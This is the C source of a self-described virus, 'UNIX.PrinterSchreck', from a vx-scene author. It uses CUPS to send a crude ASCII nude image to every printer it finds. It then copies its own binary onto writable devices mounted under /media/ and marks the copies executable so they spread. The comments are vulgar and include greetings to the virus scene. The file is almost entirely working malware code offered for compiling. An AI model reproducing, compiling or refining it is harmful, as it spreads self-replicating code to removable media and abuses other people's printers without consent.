#include <stdio.h>
#include <dirent.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <cups/cups.h>
#include <unistd.h>
#include <errno.h> 

/*
 * UNIX.PrinterSchreck by Perforin - vxnetw0rk
 * 
 * Bringing oldschool back to the scene ;)
 * 
 * Uses CUPS to search for available printers and prints an ASCII pic
 * with all found printers.
 * Then it spreads to writeable mounted devices as UNIX.PrinterSchreck
 * 
 * Greetings to skier_, Metal-, belial, R3s1stanc3, ringi, knowlegend
 * SPTH, WarGame and everyone in the scene.
 * 
 * 
 * Compiling:
 * gcc -o UNIX.PrinterSchreck `cups-config --cflags` UNIX.PrinterSchreck.c `cups-config --libs`
 */

struct dirent *dptr;
struct stat st;

char *floppy = "floppy0"; 										/* don't copy (to) that floppy */
char *cwd;

char ch;
char media[8] = "/media/";
char fname[20] = "UNIX.PrinterSchreck";

char *payload = "\n                                                     \n"\
"                       8888  8888888                                   \n"\
"                  888888888888888888888888                             \n"\
"               8888:::8888888888888888888888888                        \n"\
"             8888::::::8888888888888888888888888888                    \n"\
"            88::::::::888:::8888888888888888888888888                  \n"\
"          88888888::::8:::::::::::88888888888888888888                 \n"\
"        888 8::888888::::::::::::::::::88888888888   888               \n"\
"           88::::88888888::::m::::::::::88888888888    8               \n"\
"         888888888888888888:M:::::::::::8888888888888                  \n"\
"        88888888888888888888::::::::::::M88888888888888                \n"\
"        8888888888888888888888:::::::::M8888888888888888               \n"\
"         8888888888888888888888:::::::M888888888888888888              \n"\
"        8888888888888888::88888::::::M88888888888888888888             \n"\
"      88888888888888888:::88888:::::M888888888888888   8888            \n"\
"     88888888888888888:::88888::::M::;o*M*o;888888888    88            \n"\
"    88888888888888888:::8888:::::M:::::::::::88888888    8             \n"\
"   88888888888888888::::88::::::M:;:::::::::::888888888                \n"\
"  8888888888888888888:::8::::::M::aAa::::::::M8888888888       8       \n"\
"  88   8888888888::88::::8::::M:::::::::::::888888888888888 8888       \n"\
" 88  88888888888:::8:::::::::M::::::::::;::88:88888888888888888        \n"\
" 8  8888888888888:::::::::::M::'@@@@@@@'::::8w8888888888888888         \n"\
"  88888888888:888::::::::::M:::::'@a@':::::M8i888888888888888          \n"\
" 8888888888::::88:::::::::M88:::::::::::::M88z88888888888888888        \n"\
"8888888888:::::8:::::::::M88888:::::::::MM888!888888888888888888       \n"\
"888888888:::::8:::::::::M8888888MAmmmAMVMM888*88888888   88888888      \n"\
"888888 M:::::::::::::::M888888888:::::::MM88888888888888   8888888     \n"\
"8888   M::::::::::::::M88888888888::::::MM888888888888888    88888     \n"\
" 888   M:::::::::::::M8888888888888M:::::mM888888888888888    8888     \n"\
"  888  M::::::::::::M8888:888888888888::::m::Mm88888 888888   8888     \n"\
"   88  M::::::::::::8888:88888888888888888::::::Mm8   88888   888      \n"\
"   88  M::::::::::8888M::88888::888888888888:::::::Mm88888    88       \n"\
"   8   MM::::::::8888M:::8888:::::888888888888::::::::Mm8     4        \n"\
"       8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm    2        \n"\
"      88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M            \n"\
"     8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M            \n"\
"    88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M            \n"\
"   88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:            \n"\
"   8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M           \n"\
"     88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M         \n"\
"    888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M        \n"\
"    888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8       \n"\
"    88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@      \n"\
"    8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@'     \n"\
"     888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8       \n"\
"     888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M        \n"\
"      88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM         \n"\
"      88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM           \n"\
"        88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM            \n"\
"         88   8MM::::::::::::::::::::::::::::::::::MMMMMM              \n"\
"          8   88MM::::::::::::::::::::::M:::M::::::::MM                \n"\
"              888MM::::::::::::::::::MM::::::MM::::::MM                \n"\
"             88888MM:::::::::::::::MMM:::::::mM:::::MM                 \n"\
"             888888MM:::::::::::::MMM:::::::::MMM:::M                  \n"\
"            88888888MM:::::::::::MMM:::::::::::MM:::M                  \n"\
"           88 8888888M:::::::::MMM::::::::::::::M:::M                  \n"\
"           8  888888 M:::::::MM:::::::::::::::::M:::M:                 \n"\
"              888888 M::::::M:::::::::::::::::::M:::MM                 \n"\
"             888888  M:::::M::::::::::::::::::::::::M:M                \n"\
"                                                                     	\n"\
" Imma in ur computerz sending titz 2 ur printerz trolololololololololo \n";


FILE *from, *to, *drop;
pid_t  pid;

int res;
int main(int argc, char *argv[])
{
	
cwd = getcwd (0, 0);
pid = fork();

if (pid == -1)
{  
	exit(1); 													/* Y U NO LET US FORK?! */
}
if (pid == 0)
{
/* Child process
 * Does the printing stuff.
 * Thx to CUPS :)
 */

drop = fopen(".payload.tmp","w");
fprintf(drop,"%s",payload);
fclose(drop);
	
int i;
int job_id;
int num_options;

cups_dest_t *dests, *dest;
cups_option_t *options;

int num_dests = cupsGetDests(&dests);

  for (i = num_dests, dest = dests; i > 0; i --, dest ++)
  {
		if (dest->instance)
			printf("%s/%s\n", dest->name, dest->instance);
			job_id = cupsPrintFile(dest->name, ".payload.tmp", "Payload", num_options, options);
  }

_exit(0);
}
else
{ 
/* Parent process
 * Does the spreading.
 * Finds mounted writable devices.
 */

DIR *dirp;

	if((dirp=opendir(media))==NULL)
	{
		exit(1);												 /* DAFUQ is wrong with you?! */
	}
	
		while(dptr=readdir(dirp))
		{
			res = stat(dptr->d_name, &st);
				if (st.st_mode == (S_IFDIR & S_IRWXU)) {
					if (strcmp(dptr->d_name,floppy) != 0) {
						if((from = fopen(argv[0], "rb"))==NULL) /* open yourself */
						{ 
							exit(1); 							/* Or just go kill yourself */
						}

					chdir(media); 								/* chdir to /media/ */
					chdir(dptr->d_name);						/* chdir to mounted device */

						if((to = fopen(fname, "wb"))==NULL)
						{
						exit(1); 								/* Arg, no spreading? :( */
						}

							while(!feof(from))
							{
								ch = fgetc(from);
									if(ferror(from))
									{
									exit(1);
									}
									if(!feof(from)) fputc(ch, to);
										if(ferror(to)) {
										exit(1);
										}
							}

						if(fclose(from)==EOF) {
						exit(1);
						}
						if(fclose(to)==EOF) {
						exit(1);
						}
  
					chmod(fname, 0755); 						/* chmod that bitch. Bitches love chmod */
					chdir(cwd);									/* Don't forget to get outta there */

					}
				}
		}
	closedir(dirp);     

exit(0);
}

}
